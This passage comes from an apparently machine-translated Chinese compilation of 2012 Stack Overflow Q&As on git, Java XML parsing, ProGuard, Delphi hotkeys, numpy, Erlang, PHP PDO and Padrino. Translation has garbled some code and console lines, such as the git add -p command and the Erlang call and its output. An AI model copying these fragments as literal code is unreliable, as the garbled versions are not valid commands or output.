var types:XMLList = _rawWSDL.wsdl::types;
var schema:XMLList = types.s::schema; //error on this line 
```

wsdl 似乎没有与“s”相关的任何内容，我尝试了“xsd”（解析为[http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema)），但这给出了 Error: Method not found`XMLList = schema.s::element;`原样空的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:43:24.423

好吧，您可以用另一个前缀替换一个前缀 - 实际上我会从 XML 中删除所有名称空间，因为它只是草率且无用。但是我也会尽量避免使用 XML……但是如果您的最终目标是按原样使用服务，那么要么将前缀替换为您需要的前缀，要么找出您真正需要它的原因。

在这里，我整理了一个快速示例，说明如何在整个文档中替换目标命名空间：http: [//pastebin.com/5spKs654](http://pastebin.com/5spKs654)。但我宁愿重新考虑使用用于处理 XML 的库，因为他们提出的要求很奇怪（我怀疑其余代码可能同样奇怪）。

# git - Git：如何防止提交仅出于调试目的而修改的文件？

> ID：10220063
> 
> 赞同：8
> 
> 时间：2012-04-19T00:34:38.030
> 
> 标签：git, perforce

很多时候，我喜欢修改一些代码行以使调试更容易，但我实际上并不想提交它们。例如，我将通过注释掉一些代码行来禁用一些烦人的功能（如广告），或者我将日志级别和过滤器设置为仅我关心的那些，或者我将强制条件为真就这样我要运行的代码块实际上一直在运行。

在 Perforce 中，我会为这些文件创建一个“更改列表”并将其标记为“不要提交！”。在 Git 中相当于什么？分支不起作用，因为这些仅用于调试的修改需要与我当前正在进行的其他更改一起存在。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T00:44:32.613

查找 --assume-unchanged 选项。有一篇[关于此](http://gitready.com/intermediate/2009/02/18/temporarily-ignoring-files.html)的博客文章很好地解释了事情。还有[这个](http://archive.robwilkerson.org/2010/03/02/git-tip-ignore-changes-to-tracked-files/)提到稍后找到这些被忽略的文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-06T23:47:12.330

谢谢大家的回答。我最终做的是在 git 中编写一个 pre-commit 钩子，用于检查每个文件中的字符串“dont commit”（和其他变体）。如果是这样，则提交失败，我必须在提交之前编辑这些行。这是因为调试代码应该基于每行而不是每个文件来处理，因为有些文件既有调试更改，也有要提交的实际更改。（我用 perforce 的旧解决方案没有解决这个问题）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T01:58:04.837

我通常做的只是将调试代码放在自己的提交中，然后再恢复该提交。一个更复杂的解决方案是创建一个中间分支`master`，调用它`debug`。在分支中进行所有调试更改`debug`，然后将功能分支从`debug`. 当您准备好删除调试更改时，只需将您的功能分支重新定位到`master`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T10:13:42.023

您实际上不想忽略这些文件，而是忽略这些更改。

我在这里看到两个解决方案：

1.  恢复 HEAD

我用于这种情况的命令是：

```
git checkout -- file ... 
```

使用您为调试目的而修改的所有文件。

这会将文件恢复为`HEAD`. 然后你可以安全地制作你的`git commit -a`或任何东西。

2.  告诉 git 问你要提交哪些更改（每个文件）

    混帐添加 -p 。

请参阅[#1085162](https://stackoverflow.com/questions/1085162/how-can-i-commit-only-part-of-a-file-in-git)。

但是您仍然需要删除调试代码。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-02T08:59:50.837

一种不通用但可能适合某些工作流程场景的解决方案是应用 Git 的预提交过滤器（[手动](http://git-scm.com/docs/gitattributes)、[手动 + 示例](http://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes)）。简而言之，它只是一个预处理工具，会在实际提交之前对所有提交的文件进行调用。您可以使用这种机制来去除某些模式，例如`//<NOCOMMIT ... //NOCOMMIT>`或任何您喜欢的模式。缺点是这些调试行在重置为提交甚至拉/合并时可能会消失（我没有检查）。

# java - javax.xml.transform 带有凭据的源

> ID：10220065
> 
> 赞同：0
> 
> 时间：2012-04-19T00:34:55.667
> 
> 标签：java, xml, xml-parsing

我正在通过 Java 应用程序转换一些 xml。我用 javax.xml.transform.Source 加载 xml

```
Source src = new StreamSource(getXml()); 
```

解析 xml 时，它会尝试加载 DTD 和一些实体：

```
<!DOCTYPE dmodule SYSTEM "http://mysecureserver/System/DTD/dmodule/proced.dtd"[
 <!NOTATION SWF SYSTEM "">
 <!NOTATION PNG SYSTEM "">
 <!ENTITY % catalog PUBLIC "-//MyCompany//ENTITIES//EN "http://mysecureserver/catalog.pen">
  %catalog;
]> 
```

我收到文件 IO 错误，因为没有凭据我无法访问文件“catalog.pen”。有没有办法将凭据传递给 javax.xml.transform.Source？

此外，我不能更改 DTD 声明，因为我不“拥有”xml。我只能读它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T07:10:35.667

您可以使用自定义实体解析器来检索文件（通过使用凭据或使用文件的缓存版本）。有关示例，请参阅[Java、xml、XSLT：防止 DTD 验证](https://stackoverflow.com/questions/1572808/java-xml-xslt-prevent-dtd-validation)。

# java - proguard 是否可以混淆静态字符串常量？

> ID：10220069
> 
> 赞同：47
> 
> 时间：2012-04-19T00:35:47.823
> 
> 标签：java, android, obfuscation, proguard

proguard 会混淆静态字符串常量吗？

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2012-09-30T21:47:07.207

ProGuard 不会混淆字符串常量，如其[FAQ](http://proguard.sourceforge.net/FAQ.html#encrypt)中所述。它最近专门针对 Android 的闭源兄弟[DexGuard](http://www.saikoa.com/dexguard)提供了额外的应用程序保护技术，例如字符串加密和类加密。

（我是 ProGuard 和 DexGuard 的开发者）

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-17T10:34:21.097

不，ProGuard 不加密字符串常量（[Proguard FAQ Link](http://proguard.sourceforge.net/FAQ.html#encrypt)）

但是有一些商业产品可以帮助你。我会推荐[Stringer Java Obfuscator](http://jfxstore.com/stringer)，因为它具有*检查调用上下文和完整性控制功能*，这使得逆向工程尽可能困难。恕我直言 Stringer 是当今市场上最好的 Java 和 Android 字符串加密器。

另请参阅[Allatori Java 混淆器](http://www.allatori.com/)。

注意，我是 Licel LLC 的首席执行官。Stringer Java 混淆器的开发者。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-04-19T01:10:54.637

ProGuard*所做的*（如果配置正确的话）是内联字符串常量。混淆它们没有多大意义，想想看，一个字符串常量可以用来向用户表示一条消息，如果它被混淆有什么好处呢？

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-19T01:05:18.940

根据我对手册中混淆选项的阅读，答案是否定的。

字符串文字混淆在理论上是可能的，但有必要使用特殊的类加载器在从类文件中读取字符串文字时对其进行去混淆处理。这会很棘手。最重要的是，它并没有取得太大的成就，因为有人可以通过运行带有 Java 调试器的应用程序来轻松恢复原始字符串。

# delphi - Delphi 2007 - 如果设置“MainFormOnTaskBar := True”，则系统范围的热键不是“系统范围的”

> ID：10220071
> 
> 赞同：9
> 
> 时间：2012-04-19T00:35:50.867
> 
> 标签：delphi, delphi-2007

我有一个 Delphi 2007 项目，它在 Windos XP、Vista 和“7”上运行良好多年。它是 Delphi 5 的升级版，因此默认情况下“MainFormOnTaskBar”为“false”（我从未在 DPR 中更改过它）。在这种情况下，系统范围的热键在主窗体的 OnCreate 事件处理程序中使用以下代码在“系统范围内”工作。

```
HotKey_xyz := GlobalAddAtom('Hotkey_xyz');
if NOT RegisterHotKey(Self.Handle, HotKey_xyz, MOD_CONTROL, VK_F12) then
    ShowMessage('Unable to register Control-F12 as system-wide hot key') ;

(I have GlobalDeleteAtom() and UnregisterHotKey() in Form.OnDestroy as expected.) 
```

现在，我需要一个表单来在任务栏上显示它自己的按钮，所以我在 DPR 中设置了“Application.MainFormOnTaskBar := True”。这按预期工作。但是，这具有 Control-F12 在系统范围内不起作用的副作用，它仅在我的应用程序具有焦点时才起作用（因此，它不再是“系统范围的”。）

我在网上广泛搜索了很多关于“MainFormOnTaskBar”如何/为什么影响某些子表单/模态表单行为的文章。但是，我没有发现它对我上面描述的“系统范围的热键”问题的影响。我已经测试并重新测试了我的应用程序，并将 MainFormOnTaskBar 设置为 true 和 false，而其他所有内容都保持不变。我可以肯定地验证上述系统范围热键的问题与 MainFormOnTaskBar 标志有关。

我将非常感谢有关解决方法的任何指导。我确实需要 - 一个系统范围的热键和一个在任务栏上有自己的按钮的表单。

非常感谢您。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-19T01:15:54.087

`TApplication.MainFormOnTaskbar`对系统范围的热键完全没有影响。我可以肯定地证实这一点。无论设置为什么，无论应用程序是否聚焦等，我都能够接收`WM_HOTKEY`消息。因此，无论您看到什么，都不是您认为正在发生的事情。`MainFormOnTaskbar`

最有可能的`Handle`是，表单只是在您调用后在您背后重新创建`RegisterHotKey()`，因此您丢失了`HWND`将接收`WM_HOTKEY`消息的表单。除了使用`OnCreate`事件，您应该覆盖表单的`CreateWindowHandle()`和方法，以确保无论发生什么情况，`DestroyWindowHandle()`始终为表单的当前注册热键（每当您将任何类型的数据绑定到表单时，您都应该这样做），例如：`HWND``Handle`

```
type
  TForm1 = class(TForm)
  private
    HotKey_xyz: WORD;
    procedure WMHotKey(var Message: TMessage); message WM_HOTKEY;
  protected
    procedure CreateWindowHandle(const Params: TCreateParams); override;
    procedure DestroyWindowHandle; override;
  end;

procedure TForm1.CreateWindowHandle(const Params: TCreateParams);
begin
  inherited;
  HotKey_xyz := GlobalAddAtom('Hotkey_xyz'); 
  if HotKey_xyz <> 0 then
    RegisterHotKey(Self.Handle, HotKey_xyz, MOD_CONTROL, VK_F12);
end;

procedure TForm1.DestroyWindowHandle(const Params: TCreateParams);
begin
  if HotKey_xyz <> 0 then
  begin
    UnregisterHotKey(Self.Handle, HotKey_xyz);
    GlobalDeleteAtom(HotKey_xyz);
    HotKey_xyz := 0;
  end;
  inherited;
end;

procedure TForm1.WMHotKey(var Message: TMessage);
begin
  ...
end; 
```

更好的选择是使用`AllocateHWnd()`分配一个单独的专用`HWND`仅用于处理热键消息（然后您可以再次使用`OnCreate`and`OnDestroy`事件），例如：

```
type
  TForm1 = class(TForm)
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    HotKey_xyz: WORD;
    HotKeyWnd: HWND;
    procedure HotKeyWndProc(var Message: TMessage);
  end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  HotKeyWnd := AllocateHwnd(HotKeyWndProc);
  HotKey_xyz := GlobalAddAtom('Hotkey_xyz'); 
  if HotKey_xyz <> 0 then
    RegisterHotKey(HotKeyWnd, HotKey_xyz, MOD_CONTROL, VK_F12);
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  if HotKey_xyz <> 0 then
  begin
    UnregisterHotKey(HotKeyWnd, HotKey_xyz);
    GlobalDeleteAtom(HotKey_xyz);
    HotKey_xyz := 0;
  end;
  if HotKeyWnd <> 0 then
  begin
    DeallocateHWnd(HotKeyWnd);
    HotKeyWnd := 0;
  end;
end;

procedure TForm1.HotKeyWndProc(var Message: TMessage);
begin
  if Message.Msg = WM_HOTKEY then
  begin
    ...
  end else
    Message.Result := DefWindowProc(HotKeyWnd, Message.Msg, Message.WParam, Message.LParam);
end; 
```

# ruby-on-rails-3 - apn_sender gem 守护进程未运行

> ID：10220072
> 
> 赞同：1
> 
> 时间：2012-04-19T00:35:55.473
> 
> 标签：ruby-on-rails-3, gem, rake, apple-push-notifications, daemon

我将 apn_sender 用于 rails 3，我已经能够安装 gem 并通过使用使其正常工作

```
rake apn:sender 
```

我试图通过启动守护进程在 ubuntu 机器上以生产模式启动它，但它似乎不起作用。当我输入

```
script/apn_sender --environment=production --verbose start 
```

我什么也没看到。不存在日志。

当我尝试打字时

```
script/apn_sender status 
```

它返回

```
apn_sender: no instances running 
```

只是想了解它为什么不运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T07:42:59.117

我刚刚解决了这个问题。尝试在 generators/apn_sender/templates 创建一个名为 'script' 的文件。.

**把它放在你的脚本文件中**

```
# !/usr/bin/env ruby

# Daemons sets pwd to /, so we have to explicitly set RAILS_ROOT
RAILS_ROOT = File.expand_path(File.join(File.dirname(__FILE__), '..'))

require 'rubygems'
require 'apn'
require 'apn/sender_daemon'

APN::SenderDaemon.new(ARGV).daemonize 
```

在您的终端中 bash 'rails g apn_sender' 并将创建与上述内容相同的 'script/apn_server'

之后 bash 这段代码

```
./script/apn_server --environment=production --verbose start 
```

它将创建 log/apn_sender.log 。尝试运行

`APN.notify('token',{:alert => '#' , :badge => 1})`

或者在rails c中确认它是否有效，当然
`rake apn:sender`

希望它会有所帮助:)

**编辑**
您必须安装 redis 并配置

# python - 有效地求和一个小的 numpy 数组，在一个巨大的 numpy 数组中广播？

> ID：10220073
> 
> 赞同：8
> 
> 时间：2012-04-19T00:36:13.863
> 
> 标签：python, matrix, numpy

我想计算一个大型（1,000,000 x 3,000）布尔 numpy 数组的索引权重总和。大布尔数组不经常更改，但权重在查询时出现，我需要非常快的答案，无需复制整个大数组，或将小权重数组扩展到大数组的大小。

结果应该是一个包含 1,000,000 个条目的数组，每个条目的权重数组条目的总和对应于该行的 True 值。

我研究过使用掩码数组，但它们似乎需要构建一个与我的大型布尔数组大小相同的权重数组。

下面的代码给出了正确的结果，但在乘法步骤中我买不起那个副本。甚至不需要乘法，因为值数组是布尔值，但至少它可以正确处理广播。

我是 numpy 的新手，并且很喜欢它，但我即将因为这个特殊问题而放弃它。我已经学会了足够的 numpy 来知道远离任何在 python 中循环的东西。

我的下一步是用 C 语言编写这个例程（顺便说一句，它的另一个好处是让我通过使用位而不是字节来节省内存。）

除非你们中的一位 numpy 大师可以将我从 cython 中拯救出来？

```
from numpy import array, multiply, sum

# Construct an example values array, alternating True and False.
# This represents four records of three attributes each:
#    array([[False,  True, False],
#           [ True, False,  True],
#           [False,  True, False],
#           [ True, False,  True]], dtype=bool)
values = array([(x % 2) for x in range(12)], dtype=bool).reshape((4,3))

# Construct example weights, one for each attribute:
#    array([1, 2, 3])
weights = array(range(1, 4))

# Create expensive NEW array with the weights for the True attributes.
# Broadcast the weights array into the values array.
#    array([[0, 2, 0],
#           [1, 0, 3],
#           [0, 2, 0],
#           [1, 0, 3]])
weighted = multiply(values, weights)

# Add up the weights:
#    array([2, 4, 2, 4])
answers = sum(weighted, axis=1)

print answers

# Rejected masked_array solution is too expensive (and oddly inverts
# the results):
masked = numpy.ma.array([[1,2,3]] * 4, mask=values) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T01:17:31.310

点积（或内积）就是你想要的。它允许您获取一个大小矩阵`m×n`和一个长度向量，`n`并将它们相乘，得到一个长度向量`m`，其中每个条目是矩阵的一行的加权和，向量的条目作为权重。

Numpy 将其实现为`array1.dot(array2)`（或`numpy.dot(array1, array2)`在旧版本中）。例如：

```
from numpy import array

values = array([(x % 2) for x in range(12)], dtype=bool).reshape((4,3))

weights = array(range(1, 4))

answers = values.dot(weights)
print answers
# output: [ 2 4 2 4 ] 
```

（不过，您应该使用[`timeit`模块](http://docs.python.org/library/timeit.html)对此进行基准测试。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:07:20.370

It seems likely that [dbaupp](https://stackoverflow.com/a/10220357/577088)'s answer is the correct one. But just for the sake of diversity, here's another solution that saves memory. This will work even for operations that don't have a built-in `numpy` equivalent.

```
>>> values = numpy.array([(x % 2) for x in range(12)], dtype=bool).reshape((4,3))
>>> weights = numpy.array(range(1, 4))
>>> weights_stretched = numpy.lib.stride_tricks.as_strided(weights, (4, 3), (0, 8)) 
```

`numpy.lib.stride_tricks.as_strided` is a wonderful little function! It allows you to specify `shape` and `strides` values that allow a small array to mimic a much larger array. Observe -- there aren't *really* four rows here; it just looks that way:

```
>>> weights_stretched[0][0] = 4
>>> weights_stretched 
array([[4, 2, 3],
       [4, 2, 3],
       [4, 2, 3],
       [4, 2, 3]]) 
```

So instead of passing a huge array to `MaskedArray`, you can pass a smaller one. (But as you've already noticed, `numpy` masking works in the opposite way you might expect; truth masks, rather than revealing, so you'll have to store your `values` inverted.) As you can see, `MaskedArray` doesn't copy any data; it just reflects whatever is in `weights_stretched`:

```
>>> masked = numpy.ma.MaskedArray(weights_stretched, numpy.logical_not(values))
>>> weights_stretched[0][0] = 1
>>> masked
masked_array(data =
 [[-- 2 --]
 [1 -- 3]
 [-- 2 --]
 [1 -- 3]],
      mask =
 [[ True False  True]
 [False  True False]
 [ True False  True]
 [False  True False]],
      fill_value=999999) 
```

Now we can just pass it to sum:

```
>>> sum(masked, axis=1)
masked_array(data = [2 4 2 4],
      mask = [False False False False],
      fill_value=999999) 
```

I benchmarked numpy.dot and the above against a 1,000,000 x 30 array. This is the result on a relatively modern MacBook Pro (`numpy.dot` is `dot1`; mine is `dot2`):

```
>>> %timeit dot1(values, weights)
1 loops, best of 3: 194 ms per loop
>>> %timeit dot2(values, weights)
1 loops, best of 3: 459 ms per loop 
```

As you can see, the built-in `numpy` solution is faster. But `stride_tricks` is worth knowing about regardless, so I'm leaving this.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T01:16:47.740

这对你有用吗？

```
a = np.array([sum(row * weights) for row in values]) 
```

这用于`sum()`立即对`row * weights`值求和，因此您不需要内存来存储所有中间值。然后列表推导收集所有值。

你说你想避免任何“在 Python 中循环”的东西。这至少使用 Python 的 C 内容进行循环，而不是显式的 Python 循环，但它不能像 NumPy 解决方案那样快，因为它使用已编译的 C 或 Fortran。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T01:20:40.893

我不认为你需要 numpy 来做这样的事情。而 1000000 x 3000 是一个巨大的数组；这很可能不适合您的 RAM。

我会这样做：

假设您的数据最初位于文本文件中：

```
False,True,False
True,False,True
False,True,False
True,False,True 
```

我的代码：

```
weight = range(1,4)    
dicto = {'True':1, 'False':0}

with open ('my_data.txt') as fin:

    a = sum(sum(dicto[ele]*w for ele,w in zip(line.strip().split(','),weight)) for line in fin) 
```

结果：

```
>>> a
12 
```

编辑：

我想我第一次稍微误读了这个问题，并将所有内容总结在一起。这是给出OP所追求的确切解决方案的解决方案：

```
weight = range(1,4)
dicto = {'True':1, 'False':0}

with open ('my_data.txt') as fin:

    a = [sum(dicto[ele]*w for ele,w in zip(line.strip().split(','),weight)) for line in fin] 
```

结果：

```
>>> a
[2, 4, 2, 4] 
```

# android - Android-是否可以让一个应用程序更改另一个应用程序？如果有怎么办？

> ID：10220077
> 
> 赞同：0
> 
> 时间：2012-04-19T00:36:30.897
> 
> 标签：android

我正在开发一个照片处理应用程序，并且想知道在用户拍摄照片后（通过某种方式更改相机应用程序）是否有办法为我的应用程序提供一些东西。另一个像我想做的事情的例子是改变日历应用程序以放置一个位置并使用 GPS 来查找到该位置的方向。有没有办法做到这一点？如果有怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:25:15.647

正如我从您的问题中了解到的那样，您希望您的应用在用户使用本机相机应用拍照时出现。虽然这是可能的（并不是说这很容易），但更好的解决方案是从您的应用程序启动相机意图（或显示相机在 SurfaceView 中看到的内容），并根据需要使用它。您不想更改系统中内置应用程序的默认行为，用户会感谢您不这样做。

有无数的教程教你如何为自己使用内置应用程序的功能。例如，[这里](https://stackoverflow.com/questions/2729267/android-camera-intent)有一个 SO 线程，它教您如何使用内置相机拍照，并在您的应用程序中使用生成的数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:46:59.553

如果你想要一个位置的方向，你需要使用 Google Maps API（或类似的），而不是 GPS。要将内容放入 Google 日历，请同时查看他们的 API。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T00:53:22.523

我不知道您是否可以更改应用程序本身，但您绝对可以将您的应用程序与其他 android 应用程序集成。有几个示例可以向您展示如何访问相机应用程序以拍照并将此图片返回到您的应用程序进行操作，或从您的图库中访问图片（查看 Intent 类，您可以将其与 startActivityonResult 一起使用，在 onActivityResult 上，在你的活动中，你操纵图片）。希望有帮助

# algorithm - Erlang代码反转字符串

> ID：10220081
> 
> 赞同：1
> 
> 时间：2012-04-19T00:37:27.227
> 
> 标签：algorithm, erlang

这是一个执行字符串反转的 Erlang 代码。

但是，它不起作用。

```
 -module(lists1).
 -export([reverse/1]).
  reverse(L) ->
        reverse(L, []).
  reverse([H|T], L) ->
        reverse(T, [H|L]);
  reverse([], L) ->
         L. 
```

列表1：反向（英国广播公司）。** 异常错误：没有函数子句匹配 list1:reverse(def,[]) (lists1.erl, line 5)

为什么 ？

任何帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-19T00:51:38.750

根据错误消息，您尝试反转原子 ( `def`) 而不是字符串 ( `"def"`)。原子不是字符串/列表，因此不匹配您的任何模式。您可以添加一个来处理这种情况：

```
reverse(A) when is_atom(A) -> list_to_atom(reverse(atom_to_list(A)));
reverse(L) -> reverse(L, []). 
```

*等等*。

这给了我这个：

> Eshell V5.7.4（使用 ^G 中止）
> 1> lists1:reverse(def)。
> 喂
> 2>

# java - 请再次提供家庭作业帮助。递归乘以偶数？

> ID：10220086
> 
> 赞同：1
> 
> 时间：2012-04-19T00:37:37.260
> 
> 标签：java, math, recursion

引号下面是我的实际任务，下面是我当前的代码。有人可以指出我正确的方向。

> 编写一个名为 multiplyEvens 的递归方法，它返回前 n 个偶数的乘积。例如， multiplyEvens(1) 返回 2， multiplyEvens(4) 返回 384（因为 2 * 4 * 6 * 8 = 384）。如果传递的值小于 1，则抛出 IllegalArgumentException。

```
 private static int multiplyEvens(int n)
  {  
      if(n%2 == 0)
      {           
          System.out.println(n*n);
          return multiplyEvens(n*n);
                      // I'm lost
      }
      System.out.println();
      return n; 
  } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T00:42:25.687

尝试在 n-1 上而不是在 n*n 上递归，看看你是否能弄清楚 的值`multiplyEvens(n)`与`multiplyEvens(n-1)`. 也许这会给你一个正确的方向。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-19T00:43:50.410

在纸上走一遍。

从 n = 1 开始

```
1%2 = 1 so you don't do into your loop, and return value = 1 (wrong) 
```

尝试 n = 2

```
2%2 = 0, so you go into your loop and call multiplyEvens(2*2)
4%2 = 0, so you go into your loop and call multiplyEvens(4*4)
16%2 = 0 ... 
```

到目前为止，您应该开始了解您的方法中至少存在一个问题......

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-19T00:42:50.570

任何可以递归完成的事情都可以迭代完成。可以这样想：当您编写一个 for 循环时，在确定您正在处理的任何值的奇偶校验（偶数/奇数）值之前，您需要拥有一个额外的值，最多为 n。

由于这是家庭作业，这里是粗略的描边：

*   您的递归条件可能需要两个参数而不是一个。
*   您应该将值相乘直到某个值`i <=n`。

你大部分时间都在。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T00:44:27.020

你应该倒着做。即在每个递归调用中，返回 (2 * n) * 减少 n 的递归调用。基本情况是当 n = 1 时，该函数仅返回 2 而不将其与另一个递归调用相乘（以实现您需要在 n < 1 时抛出的 IllegalArgumentException）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-19T01:20:19.253

乘以 n 个偶数等于
2^n * n!
你所要做的就是谷歌阶乘递归java

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-19T02:02:24.970

干得好：

```
public static void main(String[] args) {
    System.out.println(multiplyEvens(4));
}

private static int multiplyEvens(int n) {
    if(n < 1) throw new IllegalArgumentException("Value less than 1 not supported");
    else if(n == 1) return 2;
    else return multiplyEvens(n-1) * (n*2);
} 
```

这里是递归算法的基础知识。您必须假设您已经为 n-1 计算了结果。然后返回为 n 调整的 n-1 的结果。（也就是说，你乘以第 n 个偶数，n*2）。递归方法调用完成其余的工作，它反过来假设它已经计算了 n-2 的值，等等......直到 n==0，结果为 1

# php - PHP PDO错误无论如何都成功

> ID：10220095
> 
> 赞同：1
> 
> 时间：2012-04-19T00:39:11.957
> 
> 标签：php

我的数据库有问题！这是我的代码：

```
<?php
$host = "/homes/49/jc192699/public_html/dbase";
$database = "EduPro.db";
$dbhandle = new PDO("sqlite:".$host.$database);

if (!$dbhandle){
echo "Error connecting to database.\n";
}

else{
echo "<br>";
echo "<br>";
echo "Database connection successful!";
}

mysql_select_db($database);

?> 
```

问题是它说“数据库连接成功！” 不管我做什么，如果我输入错误的地址，它仍然说成功，当我将数据库重命名为不存在的数据库时，它仍然说成功。我看不出这里有什么问题？

如果有人可以帮助我，将不胜感激！

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:43:18.850

对于初学者，`PDO`如果出现错误，构造函数会抛出异常。它**不**返回`false`。使用检查错误

```
try {
    $dbhandle = new PDO("sqlite:".$host.$database);
} catch (PDOException $e) {
    echo 'Connection failed: ' . $e->getMessage();
} 
```

其次，当您使用 SQLite 时，如果您的`dbase`目录可由脚本写入，您的连接尝试将创建一个空数据库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:44:16.217

试试这个：

```
<?php
try {
    /*** connect to SQLite database ***/
    $dbh = new PDO("sqlite:/path/to/database.sdb");
    }
catch(PDOException $e)
    {
    /*** real error message prints here ***/
    echo $e->getMessage();
    }
?> 
```

这直接取自这里： [http ://www.phpro.org/tutorials/Introduction-to-PHP-PDO.html#4.2](http://www.phpro.org/tutorials/Introduction-to-PHP-PDO.html#4.2)

# ant - 从 Gradle 使用 ANTBuilder 时 ant 插件的类路径

> ID：10220099
> 
> 赞同：6
> 
> 时间：2012-04-19T00:39:25.530
> 
> 标签：ant, gradle

我有一个`build.gradle`加载[PMD](http://pmd.sourceforge.net/)的文件（从上游 Maven 下载），然后加载需要 PMD 的 Ant build.xml 文件：

```
buildscript {
  repositories {
    mavenCentral()
  }
  dependencies {
    classpath 'pmd:pmd:4.2.5'
  }
}
ant.importBuild 'shared-build.xml' 
```

但是，Ant 导入失败：

```
taskdef class net.sourceforge.pmd.ant.PMDTask cannot be found
using the classloader AntClassLoader[]
  at org.apache.tools.ant.ProjectHelper.addLocationToBuildException(ProjectHelper.java:551)
[...]
  at org.gradle.api.internal.project.DefaultAntBuilder.importBuild(DefaultAntBuilder.groovy:76) 
```

如何指示[Gradle 的 ant 集成](http://gradle.org/docs/current/userguide/ant.html)以使其可用？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-13T15:06:11.660

没有直接的方法可以做到这一点，因为 Gradle 不为此提供任何 API 支持。所以你需要以某种方式破解它。

例如，你可以在调用 ant.importBuild 之前做这样的事情

```
org.apache.tools.ant.Project.class.classLoader.addURL( file('libs/somelib.jar').toURI().toURL() ) 
```

或者，您可以使用通过 Gradle 的依赖解析获得的路径调用 addURL() 方法（同样，这应该在调用 ant.importBuild 之前执行）。

```
configurations { someconf }
dependencies { someconf "org.eclipse.jdt:ecj:3.6.1" }

def antClassLoader = org.apache.tools.ant.Project.class.classLoader
configurations.someconf.each { File f ->
    antClassLoader.addURL(f.toURI().toURL())
} 
```

当然，另一种解决方案是在 build.xml 文件中定义类路径，这样您就不必从 Gradle 执行任何操作。

在此处查看一些输入[http://gradle.1045684.n5.nabble.com/How-to-add-to-classpath-for-ant-importBuild-td3268631.html](http://gradle.1045684.n5.nabble.com/How-to-add-to-classpath-for-ant-importBuild-td3268631.html)

# jquery - 如何清理这个 Padrino AJAX 调用？

> ID：10220102
> 
> 赞同：0
> 
> 时间：2012-04-19T00:40:18.977
> 
> 标签：jquery, sinatra, http-post, padrino

我正在编写一个应用程序，该应用程序主要是通过 AJAX 调用后端服务器的 UI。很少的页面加载。

例如，当我创建行程时，我的 JS 只是将 JSON 对象发送到 Padrino（通过 POST），然后 Padrino 保存行程对象（通过 ActiveRecord）并返回 JSON 响应。

它似乎有效，但我不仅要清理代码，还要清理提交的值。

这是我的`POST`代码（`trips controller`）

```
post :index, :provides => :json do
  response = {}
  response[:trip] = {}

  begin
      @trip = Trip.new
      @trip.title = params[:trip][:title]
      @trip.description = params[:trip][:title]

      if @trip.save
          response[:status] = "Success"
          response[:trip] = {:title => @trip.title, :description => @trip.description}
          response[:message] = "#{@trip.title} successfully saved"
      else
          response[:status] = "Error"
          response[:message] = "Error saving trip"
      end
  rescue
     response[:status] = "Error"
     response[:message] = "Error saving trip"
  end

  response.to_json
end 
```

目前，只有两个字段（标题和描述），但完成后大约有 4-8 个。我不喜欢我如何构建新的行程对象。

我尝试使用：

```
@trip = Trip.build(params[:trip]) 
```

但这没有用。

这是我发送 POST 的 JS 代码：

```
// Save new trip
$("#new_trip_save_btn").click(function() {
    var self = this;
    var new_trip = get_new_trip();

    $.ajax({
        data: {trip:new_trip},
        dataType: "json",
        url: "/trips",
        type: "post", 
        success: function(res) {
            console.log(res)
        }
    });
});

......

var get_new_trip = function() {
    var self = this;
    var trip = {};
    trip.title = $("#new_trip_title").val();
    trip.description = $("#new_trip_description").val();
    trip.departure_date = $("#new_trip_departure").val();
    trip.return_date = $("#new_trip_return").val();

    return trip;
} 
```

那么我可以做些什么来清理代码（删除 POST 操作中的冗余）并确保在保存之前对文本进行清理。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T09:12:24.733

首先，您应该使用 attr_accessible 和 attr_protected aka [mass assignment](http://blog.mhartl.com/2008/09/21/mass-assignment-in-rails-applications/)保护您的模型免受大规模分配。

然后我强烈建议使用“表单”，这样您的网站就可以在没有启用 javascript 的情况下运行。

所以使用[不显眼](http://en.wikipedia.org/wiki/Unobtrusive_JavaScript)的javascripts 代码也可以更好。

```
// Live watch events on form submit
$(document).on('submit', 'form[data-remote]', function(e){
  e.preventDefault();
  self = $(this);
  $.ajax({
    url: self.attr('action'),
    data: self.serializeArray(),
    type: self.attr('method'),
    dataType: 'json',
    success: function(res){ console.log(res) }
  })
}); 
```

